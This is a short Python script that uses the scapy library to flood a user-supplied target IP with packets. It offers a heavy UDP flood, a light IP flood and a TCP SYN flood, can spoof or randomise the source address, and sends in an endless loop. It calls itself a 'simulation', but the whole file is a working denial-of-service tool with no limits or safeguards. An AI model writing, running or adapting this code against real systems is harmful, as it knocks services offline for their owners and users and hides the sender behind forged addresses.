import scapy.all as scp
import random

MAX_PORT = 65535

ip_src = input("Fake Source IP (blank for random IP): ")
ip_dst = input("Target IP: ")

attack_type = input(
    "1. Heavy packet flood \n2. Light packet flood \n3. SYN flood \nAttack Type (default 1):"
)

pkg_size = 0
if not (attack_type == "2") and not (attack_type == "3"):
    pkg_size = input("Packet Size (blank for max): ")

if not (pkg_size):
    pkg_size = MAX_PORT - 535


def dos_simulation(ip_src, ip_dst, pkg_size):

    ip_layer = scp.IP(src=scp.RandIP(), dst=ip_dst)

    if ip_src:
        ip_layer.src = ip_src

    udp_layer = scp.UDP(sport=80, dport=21)
    raw_layer = scp.Raw(int(pkg_size))

    packet = ip_layer / udp_layer / raw_layer
    if attack_type == "2":
        packet = ip_layer

    if attack_type == "3":
        tcp_layer = scp.TCP(
            sport=80, dport=21, seq=random.randint(0, MAX_PORT), flags="S"
        )
        packet = ip_layer / tcp_layer

    scp.send(packet, loop=1)
    print(packet)


dos_simulation(ip_src, ip_dst, pkg_size)
